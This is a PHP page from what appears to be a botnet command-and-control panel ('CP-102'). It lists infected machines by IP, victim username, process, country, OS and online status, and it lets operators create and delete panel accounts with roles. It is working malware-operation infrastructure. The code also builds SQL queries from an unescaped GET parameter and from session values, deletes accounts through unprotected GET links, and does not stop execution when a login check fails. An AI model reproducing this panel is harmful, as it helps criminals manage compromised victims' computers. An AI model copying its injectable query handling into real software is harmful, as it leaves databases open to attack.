<?php
require 'db.php';
include ('db.php');

include 'include/geo/geoip.inc';
$gi = geoip_open("include/geo/GeoIP.dat", "");

ob_end_clean();
ob_start();

$expire = 365*24*3600;
ini_set('session.gc_maxlifetime', $expire);
session_start();

// Check if user is logged in using the session variable
if(empty($_SESSION["logged_in"])){
    if(empty($_SESSION["user"])){
        header("location: error.php");
    }else{
        setcookie(session_name(),session_id(),0);
        // Makes it easier to read
        $user = $_SESSION['user'];
        $active = $_SESSION['active'];
        }
}
else
{
    setcookie(session_name(),session_id(),time()+$expire);
    // Makes it easier to read
    $user = $_SESSION['user'];
    $active = $_SESSION['active'];
}

$bootstrapalert = '';   
if($_POST && isset($_POST['username']) && isset($_POST['password']) && isset($_POST['permissions'])){
    
    $user_tocreate = $mysqli->escape_string($_POST['username']);
    $password_tocreate = $mysqli->escape_string(password_hash($_POST['password'], PASSWORD_BCRYPT));
    $hash_tocreate = $mysqli->escape_string( md5( rand(0,1000) ) );

    if($_POST['permissions'] === "1"){
        $role_tocreate = "User";
    }
    if($_POST['permissions'] === "2"){
        $role_tocreate = "Moderator";
    }
    if($_POST['permissions'] === "3"){
        $role_tocreate = "Admin";
    }

    $result = $mysqli->query("SELECT * FROM accounts WHERE user='$user_tocreate'");
    $rowsget = 0;
    if($result){
        $rowsget = $result->num_rows;
    }
    if ( $rowsget > 0 ) {
$bootstrapalert = <<<btalert

<div class="alert alert-danger alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Error: </strong>  Username already exists.
</div>
btalert;
        die();
    }else{
   
    $sql = "INSERT INTO accounts (user,password,hash,active,lastactivity,role)
    VALUES ('$user_tocreate','$password_tocreate','$hash_tocreate','0','Never','$role_tocreate')";
    
    if ($mysqli->query($sql) === TRUE) {
        $query = $mysqli->query("INSERT INTO logs (username, ipaddress, action, date) VALUES ('".$_SESSION['user']."','".$_SERVER['REMOTE_ADDR']."', CONCAT('Account ''', '".$user_tocreate."' ,''' ' , 'with ''','".$role_tocreate."',''' permissions created'),'".time()."');") or die("Error" .$mysqli->error);
    
$bootstrapalert = <<<btalert

<div class="alert alert-success alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Success: </strong> Account '<b>$user_tocreate</b>' created... Redirecting ...
</div>
btalert;
header( "refresh:3; url=users.php" );  
            } else {
                $mysqlerror = $mysqli->error;
$bootstrapalert = <<<btalert
        
<div class="alert alert-danger alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Error: </strong>  $mysqlerror.
</div>
btalert;
            }
        }
    }
        else{
            if($_POST){
$bootstrapalert = <<<btalert

<div class="alert alert-danger alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Error: </strong>  Fill all fields to create a new user.
</div>
btalert;
}
        }



// Bot list replace var
$newbotslistre = '';
$alternate = 1;
$totalbotsindb = 0;
$newbotslistempleft = '<tr>
<td colspan="1" align="center" class="td_c3">
    <input type="checkbox" name="check" value="1" class="chkCert"/>
</td>
<td colspan="1" align="center" class="td_c3" id="bot_id"><a href="bot.php?bot_id=#bot_id_row" class="botid"><b>#bot_id_row</b></a></td>
<td colspan="1" align="center" class="td_c3">#ipv4_row</td>
<td colspan="1" align="center" class="td_c3" >#username_row</td>
<td colspan="1" align="center" class="td_c3">#procname_row</td>
<td colspan="1" align="left" class="td_c3">#country_row</td>
<td colspan="1" align="center" class="td_c3">#osver_row</td>
<td colspan="1" align="center" class="td_c3">#lastactivity_row</td>
#status_row</td>
</tr>
';




// Format Bytes
function convertToReadableSize($size){
  $base = log($size) / log(1024);
  $suffix = array(" B", " KB", " MB", " GB", " TB");
  $f_base = floor($base);
  return round(pow(1024, $base - floor($base)), 1) . $suffix[$f_base];
}

if($_GET && isset($_GET['rem'])){
    $usert = $_GET['rem'];
    $sql = "DELETE FROM accounts WHERE user='$usert'";
    if ($mysqli->query($sql) === TRUE) {
        $query = $mysqli->query("INSERT INTO logs (username, ipaddress, action, date) VALUES ('".$_SESSION['user']."','".$_SERVER['REMOTE_ADDR']."', CONCAT('Account ''', '".$usert."' ,''' removed'),'".time()."');") or die("Error" .$mysqli->error);
        
        if ($user === $usert){
            header("location: logout.php");
        }
$bootstrapalert = <<<btalert

<div class="alert alert-success alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Success: </strong> Account '<b>$usert</b>' removed.
</div>
btalert;
    } else {
        $mysqlerror = $mysqli->error;
$bootstrapalert = <<<btalert

<div class="alert alert-danger alert-dismissible" style="margin-left:0">
<a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
<strong>Error: </strong>  $mysqlerror.
</div>
btalert;
    }
}
// Users
$user0 = <<<BD1
<tr>
    <td>#id</td>
    <td>#username</td>
    <td>#Active</td>
    <td>#LastActivity</td>
    <td>#Role</td>
    <td  data-id="#username"><center>
        <a href="#myModal" role="button" data-toggle="modal" ><i class="fa fa-trash-o"></i></a>
        </center>
    </td>
</tr>
BD1;
$users = "";
if ($totusers = $mysqli->query("SELECT * FROM accounts"))
        {
            while ($row = $totusers->fetch_assoc()) {

            $users .= str_replace("#id", $row['id'], $user0);
            $users = str_replace("#username", $row['user'], $users);

            if ($row['active'] === "1"){
                $users = str_replace("#Active", "Active" , $users);
            }else{
                $users = str_replace("#Active", "Disconnected", $users);
            }

            $users = str_replace("#LastActivity", $row['lastactivity'], $users);
            $users = str_replace("#Role",  $row['role'], $users); //Add DB field;
            }
}
// Bots Query
if ($bots_new = $mysqli->query("SELECT * FROM bots"))
        {
                if($bots_new->num_rows === 0){
                    $newbotslistre = '<td colspan="11">No data to display.</td>';
                }else{
                        while ($row = $bots_new->fetch_assoc()) {

                            $totalbotsindb = $bots_new->num_rows;

                            //Bot ID
                            $newbotslistre .= str_replace("#bot_id_row", $row['bot_id'], $newbotslistempleft);
                            //IPV4
                            $newbotslistre = str_replace("#ipv4_row", $row['ipv4'], $newbotslistre);
                            //Username
                            $newbotslistre = str_replace("#username_row", $row['username'], $newbotslistre);
                            //Process
                            $newbotslistre = str_replace("#procname_row", $row['process_name'], $newbotslistre);
                            //Country
                            $countrytorep = strtolower(geoip_country_code_by_id($gi, $row['country']));
                            $countrytoname = geoip_country_name_by_id($gi, $row['country']);

                            if ($countrytorep === ""){
                                $countryrow ='<img src="./images/flags/--.png" width="16px" height="10px"> ';
                                $countryrow .= "Unknown" ;
                            }else{
                                $countryrow ='<img src="./images/flags/'.$countrytorep.'.png" width="16px" height="10px"> ';
                                $countryrow .= $countrytoname ;
                            }
                            $newbotslistre = str_replace("#country_row", $countryrow , $newbotslistre);
							//Os
                            $newbotslistre = str_replace("#osver_row", $row['os_version'], $newbotslistre);
                            //Last Activity
                            $lastactivity = str_replace("_"," ",$row['last_activity']);
							$newbotslistre = str_replace("#lastactivity_row",$lastactivity , $newbotslistre);
                            //Online Time
                            // If bot connected in last 10 seconds means it's online
                            $now_sub = time();
                            $last_sub = strtotime($lastactivity);
                            //echo $now_sub." ".$last_sub."<br>";
                            $fin_sub = $now_sub - $last_sub;
							$isonline = 0;
                            if ($fin_sub <= 10) {
                                $newbotslistre = str_replace("#status_row",'<td colspan="1" align="center" class="online">Online', $newbotslistre);
								$isonline = 1;
                            }else{
                                $newbotslistre = str_replace("#status_row",'<td colspan="1" align="center" class="offline">Offline', $newbotslistre);
								$isonline = 0;
                            }

							
                            if($alternate == 1){
                                $newbotslistre = str_replace("%alt%", 1, $newbotslistre);
                                $alternate = 2;
                            }else{
                                $newbotslistre = str_replace("%alt%", 2, $newbotslistre);
                                $alternate = 1;
                            }
                        }
                    }
        

            
}else{
	die($mysqli->error);
}

$sql = "SELECT lastactivity,showbots FROM accounts WHERE user = '$user'";
$result = $mysqli->query($sql);
if ($result->num_rows > 0) {
	while($row = $result->fetch_assoc()) {
        $lastactivity = $row['lastactivity'];
        $showbots = $row['showbots'];
	}
} else {
    die($mysqli->error);
}
if ($showbots === "True"){
    $showbotsnotify = '<span class="label label-info">+'.$totalbotsindb.'</span>';
}else{
    $showbotsnotify = "";
}

//Unauth
$unauth = <<<Bdy1
<!doctype html>
<html lang="en"><head>
    <meta charset="utf-8">
    <title>Client List</title>
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="lib/bootstrap/css/bootstrap.css">
    <link rel="stylesheet" href="lib/font-awesome/css/font-awesome.css">

    <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<link href="css/datatables/dataTables.bootstrap.css" rel="stylesheet" type="text/css" />

    
    <script src="lib/jquery-1.11.1.min.js" type="text/javascript"></script>
    <script>
    function sortTable(n) {
      var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
      table = document.getElementById("myTable");
      switching = true;
      //Set the sorting direction to ascending:
      dir = "asc"; 
      /*Make a loop that will continue until
      no switching has been done:*/
      while (switching) {
        //start by saying: no switching is done:
        switching = false;
        rows = table.getElementsByTagName("TR");
        /*Loop through all table rows (except the
        first, which contains table headers):*/
        for (i = 1; i < (rows.length - 1); i++) {
          //start by saying there should be no switching:
          shouldSwitch = false;
          /*Get the two elements you want to compare,
          one from current row and one from the next:*/
          x = rows[i].getElementsByTagName("TD")[n];
          y = rows[i + 1].getElementsByTagName("TD")[n];
          /*check if the two rows should switch place,
          based on the direction, asc or desc:*/
          if (dir == "asc") {
            if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
              //if so, mark as a switch and break the loop:
              shouldSwitch= true;
              break;
            }
          } else if (dir == "desc") {
            if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
              //if so, mark as a switch and break the loop:
              shouldSwitch = true;
              break;
            }
          }
        }
        if (shouldSwitch) {
          /*If a switch has been marked, make the switch
          and mark that a switch has been done:*/
          rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
          switching = true;
          //Each time a switch is done, increase this count by 1:
          switchcount ++;      
        } else {
          /*If no switching has been done AND the direction is "asc",
          set the direction to "desc" and run the while loop again.*/
          if (switchcount == 0 && dir == "asc") {
            dir = "desc";
            switching = true;
          }
        }
      }
    }
    </script>
        <script src="lib/jQuery-Knob/js/jquery.knob.js" type="text/javascript"></script>
    <script type="text/javascript">
        $(function() {
            $(".knob").knob();
        });
    </script>


    <link rel="stylesheet" type="text/css" href="stylesheets/theme.css">
    <link rel="stylesheet" type="text/css" href="stylesheets/premium.css">
    <script src="https://www.w3schools.com/lib/w3.js"></script>
</head>
<body class=" theme-blue">

    <script type="text/javascript">
        $(function() {
            var match = document.cookie.match(new RegExp('color=([^;]+)'));
            if(match) var color = match[1];
            if(color) {
                $('body').removeClass(function (index, css) {
                    return (css.match (/\btheme-\S+/g) || []).join(' ')
                })
                $('body').addClass('theme-' + color);
            }

            $('[data-popover="true"]').popover({html: true});
            
        });
    </script>
    <style type="text/css">
        #line-chart {
            height:300px;
            width:800px;
            margin: 0px auto;
            margin-top: 1em;
        }
        .navbar-default .navbar-brand, .navbar-default .navbar-brand:hover { 
            color: #fff;
        }
    </style>

    <script type="text/javascript">
        $(function() {
            var uls = $('.sidebar-nav > ul > *').clone();
            uls.addClass('visible-xs');
            $('#main-menu').append(uls.clone());
        });
    </script>

    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le fav and touch icons -->
    <link rel="shortcut icon" href="../assets/ico/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../assets/ico/apple-touch-icon-144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../assets/ico/apple-touch-icon-114-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../assets/ico/apple-touch-icon-72-precomposed.png">
    <link rel="apple-touch-icon-precomposed" href="../assets/ico/apple-touch-icon-57-precomposed.png">
  

  <!--[if lt IE 7 ]> <body class="ie ie6"> <![endif]-->
  <!--[if IE 7 ]> <body class="ie ie7 "> <![endif]-->
  <!--[if IE 8 ]> <body class="ie ie8 "> <![endif]-->
  <!--[if IE 9 ]> <body class="ie ie9 "> <![endif]-->
  <!--[if (gt IE 9)|!(IE)]><!--> 
   
  <!--<![endif]-->

    <div class="navbar navbar-default" role="navigation">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="" href="cp.php"><span class="navbar-brand">CP-102</span></a></div>

        <div class="navbar-collapse collapse" style="height: 1px;">
          <ul id="main-menu" class="nav navbar-nav navbar-right">
            <li class="dropdown hidden-xs">
                <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                    <span class="glyphicon glyphicon-user padding-right-small" style="position:relative;top: 3px;"></span> $user
                    <i class="fa fa-caret-down"></i>
                </a>

              <ul class="dropdown-menu">
                <li><a href="myaccount.php">My Account</a></li>
                <li class="divider"></li>
                <li class="dropdown-header">Control Panel</li>
                <li><a href="users.php">Users</a></li>
                <li class="divider"></li>
                <li><a tabindex="-1" href="logout.php">Logout</a></li>
              </ul>
            </li>
          </ul>

        </div>
      </div>
    </div>
    

    <div class="sidebar-nav">
    <ul>
    <li><a href="#" data-target=".dashboard-menu" class="nav-header" data-toggle="collapse"><i class="fa fa-fw fa-dashboard"></i> Dashboard$showbotsnotify<i class="fa fa-collapse"></i></a></li>
    <li><ul class="dashboard-menu nav nav-list collapse in">
            <li><a href="cp.php"><span class="fa fa-caret-right"></span> Main</a></li>
            <li ><a href="list.php" ><span class="fa fa-caret-right"></span> Bots</a></li>
            <li ><a href="task.php"><span class="fa fa-caret-right"></span> Tasks</a></li>
            <li class="active"><a href="users.php"><span class="fa fa-caret-right"></span> User List</a></li>
    </ul></li>
    <ul>
    <li><a href="#" data-target=".legal-menu" class="nav-header collapsed" data-toggle="collapse"><i class="fa fa-fw fa-cog"></i> Settings<i class="fa fa-collapse"></i></a></li>
    <li><ul class="legal-menu nav nav-list collapse">
        <li ><a href="set.php"><span class="fa fa-caret-right"></span> Optimization</a></li>
        <li ><a href="logs.php"><span class="fa fa-caret-right"></span> System Logs</a></li>
</ul></li>
    </div>

    <div class="content">

    <div class="alert alert-danger">You do not have permission to view this page.</div>
    <script src="lib/bootstrap/js/bootstrap.js"></script>
    <script>
    $(function () {
      $('#orderModal').modal({
          keyboard: true,
          backdrop: "static",
          show: false,
  
      }).on('show', function () {
  
      });
   </body>
</html>                         
Bdy1;
// Page
$variable = <<<Bdy
<!doctype html>
<html lang="en"><head>
    <meta charset="utf-8">
    <title>Client List</title>
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="">
    <meta name="author" content="">

    <link href='http://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" type="text/css" href="lib/bootstrap/css/bootstrap.css">
    <link rel="stylesheet" href="lib/font-awesome/css/font-awesome.css">

    <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
	<link href="css/font-awesome.min.css" rel="stylesheet" type="text/css" />
	<link href="css/ionicons.min.css" rel="stylesheet" type="text/css" />
	<link href="css/main.css" rel="stylesheet" type="text/css" />
	<link href="css/datatables/dataTables.bootstrap.css" rel="stylesheet" type="text/css" />

    
    <script src="lib/jquery-1.11.1.min.js" type="text/javascript"></script>
    <script>
    function sortTable(n) {
      var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
      table = document.getElementById("myTable");
      switching = true;
      //Set the sorting direction to ascending:
      dir = "asc"; 
      /*Make a loop that will continue until
      no switching has been done:*/
      while (switching) {
        //start by saying: no switching is done:
        switching = false;
        rows = table.getElementsByTagName("TR");
        /*Loop through all table rows (except the
        first, which contains table headers):*/
        for (i = 1; i < (rows.length - 1); i++) {
          //start by saying there should be no switching:
          shouldSwitch = false;
          /*Get the two elements you want to compare,
          one from current row and one from the next:*/
          x = rows[i].getElementsByTagName("TD")[n];
          y = rows[i + 1].getElementsByTagName("TD")[n];
          /*check if the two rows should switch place,
          based on the direction, asc or desc:*/
          if (dir == "asc") {
            if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
              //if so, mark as a switch and break the loop:
              shouldSwitch= true;
              break;
            }
          } else if (dir == "desc") {
            if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
              //if so, mark as a switch and break the loop:
              shouldSwitch = true;
              break;
            }
          }
        }
        if (shouldSwitch) {
          /*If a switch has been marked, make the switch
          and mark that a switch has been done:*/
          rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
          switching = true;
          //Each time a switch is done, increase this count by 1:
          switchcount ++;      
        } else {
          /*If no switching has been done AND the direction is "asc",
          set the direction to "desc" and run the while loop again.*/
          if (switchcount == 0 && dir == "asc") {
            dir = "desc";
            switching = true;
          }
        }
      }
    }
    </script>
        <script src="lib/jQuery-Knob/js/jquery.knob.js" type="text/javascript"></script>
    <script type="text/javascript">
        $(function() {
            $(".knob").knob();
        });
    </script>


    <link rel="stylesheet" type="text/css" href="stylesheets/theme.css">
    <link rel="stylesheet" type="text/css" href="stylesheets/premium.css">
    <script src="https://www.w3schools.com/lib/w3.js"></script>
</head>
<body class=" theme-blue">

    <script type="text/javascript">
        $(function() {
            var match = document.cookie.match(new RegExp('color=([^;]+)'));
            if(match) var color = match[1];
            if(color) {
                $('body').removeClass(function (index, css) {
                    return (css.match (/\btheme-\S+/g) || []).join(' ')
                })
                $('body').addClass('theme-' + color);
            }

            $('[data-popover="true"]').popover({html: true});
            
        });
    </script>
    <style type="text/css">
        #line-chart {
            height:300px;
            width:800px;
            margin: 0px auto;
            margin-top: 1em;
        }
        .navbar-default .navbar-brand, .navbar-default .navbar-brand:hover { 
            color: #fff;
        }
    </style>

    <script type="text/javascript">
        $(function() {
            var uls = $('.sidebar-nav > ul > *').clone();
            uls.addClass('visible-xs');
            $('#main-menu').append(uls.clone());
        });
    </script>

    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le fav and touch icons -->
    <link rel="shortcut icon" href="../assets/ico/favicon.ico">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="../assets/ico/apple-touch-icon-144-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="../assets/ico/apple-touch-icon-114-precomposed.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="../assets/ico/apple-touch-icon-72-precomposed.png">
    <link rel="apple-touch-icon-precomposed" href="../assets/ico/apple-touch-icon-57-precomposed.png">
  

  <!--[if lt IE 7 ]> <body class="ie ie6"> <![endif]-->
  <!--[if IE 7 ]> <body class="ie ie7 "> <![endif]-->
  <!--[if IE 8 ]> <body class="ie ie8 "> <![endif]-->
  <!--[if IE 9 ]> <body class="ie ie9 "> <![endif]-->
  <!--[if (gt IE 9)|!(IE)]><!--> 
   
  <!--<![endif]-->

    <div class="navbar navbar-default" role="navigation">
        <div class="navbar-header">
          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target=".navbar-collapse">
            <span class="sr-only">Toggle navigation</span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="" href="cp.php"><span class="navbar-brand">CP-102</span></a></div>

        <div class="navbar-collapse collapse" style="height: 1px;">
          <ul id="main-menu" class="nav navbar-nav navbar-right">
            <li class="dropdown hidden-xs">
                <a href="#" class="dropdown-toggle" data-toggle="dropdown">
                    <span class="glyphicon glyphicon-user padding-right-small" style="position:relative;top: 3px;"></span> $user
                    <i class="fa fa-caret-down"></i>
                </a>

              <ul class="dropdown-menu">
                <li><a href="myaccount.php">My Account</a></li>
                <li class="divider"></li>
                <li class="dropdown-header">Control Panel</li>
                <li><a href="users.php">Users</a></li>
                <li class="divider"></li>
                <li><a tabindex="-1" href="logout.php">Logout</a></li>
              </ul>
            </li>
          </ul>

        </div>
      </div>
    </div>
    

    <div class="sidebar-nav">
    <ul>
    <li><a href="#" data-target=".dashboard-menu" class="nav-header" data-toggle="collapse"><i class="fa fa-fw fa-dashboard"></i> Dashboard$showbotsnotify<i class="fa fa-collapse"></i></a></li>
    <li><ul class="dashboard-menu nav nav-list collapse in">
            <li><a href="cp.php"><span class="fa fa-caret-right"></span> Main</a></li>
            <li ><a href="list.php" ><span class="fa fa-caret-right"></span> Bots</a></li>
            <li ><a href="task.php"><span class="fa fa-caret-right"></span> Tasks</a></li>
            <li class="active"><a href="users.php"><span class="fa fa-caret-right"></span> User List</a></li>
    </ul></li>
    <ul>
    <li><a href="#" data-target=".legal-menu" class="nav-header collapsed" data-toggle="collapse"><i class="fa fa-fw fa-cog"></i> Settings<i class="fa fa-collapse"></i></a></li>
    <li><ul class="legal-menu nav nav-list collapse">
        <li ><a href="set.php"><span class="fa fa-caret-right"></span> Optimization</a></li>
        <li ><a href="logs.php"><span class="fa fa-caret-right"></span> System Logs</a></li>
</ul></li>
    </div>

    <div class="content">
    <div class="header">
        
        <h1 class="page-title">Users</h1>
    </ul>

    </div>
    $bootstrapalert
    <div class="main-content">
    
    <div class="nav-tabs-custom">
    <ul class="nav nav-tabs">
        <li class="active">
            <a href="#man" data-toggle="tab">Manage</a>
        </li>
        <li>
            <a href="#add" data-toggle="tab">Add User</a>
        </li>
    </ul>
    <div class="tab-content">
        <div class="tab-pane active" id="man">
            <table class="table">
            <thead>
            <tr>
            <th>#</th>
            <th>Username</th>
            <th>Status</th>
            <th>Last Activity</th>
            <th>Role</th>
            <th style="width: 3.5em;">Actions</th>

            </tr>
            </thead>
            <tbody>
            
            $users
            

            </tbody>
            </table>
            </div>
            <div class="tab-pane" id="add">
									<form action="users.php" method="POST" class="col-lg-6">
										<label>Username</label>
										<input type="text" class="form-control" name="username">
										<br>
										<label>Password</label>
										<input type="password" class="form-control" name="password">
										<br>
										<label>Permissions</label>
										<select class="form-control" name="permissions">
											<option value="1">User</option>
											<option value="2">Moderator</option>
											<option value="3">Admin</option>
										</select>
										<br>
										<button class="btn btn-primary"><i class="fa fa-plus"></i> New User</button>
									</form>
				<div class="clearfix"></div>
            </div>
            
            <div class="modal small fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:9999;">
            <div class="modal-dialog">
              <div class="modal-content">
                  <div class="modal-header">
                      <button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
                      <h3 id="myModalLabel">Delete Confirmation</h3>
                  </div>
                  <div id="orderDetails" class="modal-body"></div>
                  <div id="orderItems" class="modal-body"></div>

                  <div id="compose" class="modal-footer"></div>
                </div>
              </div>
          </div>

          <script src="lib/bootstrap/js/bootstrap.js"></script>
          <script>
          $(function () {
            $('#orderModal').modal({
                keyboard: true,
                backdrop: "static",
                show: false,
        
            }).on('show', function () {
        
            });
        
            $(".table").find('td[data-id]').on('click', function () {

                $('#orderDetails').html($('<p class="error-text"><i class="fa fa-warning modal-icon"></i>Are you sure you want to delete the account: <b>' + $(this).data('id') + '</b></p>'));
                $('#compose').html($('<button class="btn btn-default" data-dismiss="modal" aria-hidden="true">Cancel</button>' + '<button class="btn btn-danger" onclick="location.href=' + "'users.php?rem=" + $(this).data('id') + "'" + '"' + ' data-dismiss="modal" id="execute" style="background-color:#FF2424!important"> Delete</button>'));
                $('#myModal').modal('show');
        
        
        
            });
        
        });

      </script>

</body>
</html>
Bdy;

if ($_SESSION['role'] === "User"){
    $query = $mysqli->query("INSERT INTO logs (username, ipaddress, action, date) VALUES ('".$_SESSION['user']."','".$_SERVER['REMOTE_ADDR']."','Unauthorized user tryed to access to ''users'' page ','".time()."');") or die("Error" .$mysqli->error);
    echo $unauth; 
}else{
    echo $variable;
}
 

    

?>